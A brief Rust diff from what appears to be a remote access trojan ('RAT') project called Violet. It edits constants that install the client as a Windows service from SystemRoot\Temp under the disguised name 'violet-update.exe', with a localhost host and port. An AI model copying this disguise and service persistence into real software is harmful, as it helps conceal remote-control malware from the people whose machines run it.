@@ -4,8 +4,8 @@ pub const SERVICE_REGISTRY: &U16CStr =
     u16cstr!("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Violet");
 
 pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!("\\SystemRoot\\Temp\\violet-update.exe");
-pub const RAT_CLIENT_PATH: &U16CStr = u16cstr!(
-    "%SystemRoot%\\Temp\\violet-update.exe --host 127.0.0.1 --log-path %SystemRoot%\\System32\\violet.log --scm"
+pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(
+    "\"%SystemRoot%\\Temp\\violet-update.exe\" --host 127.0.0.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
 );
 
 #[cfg(debug_assertions)]
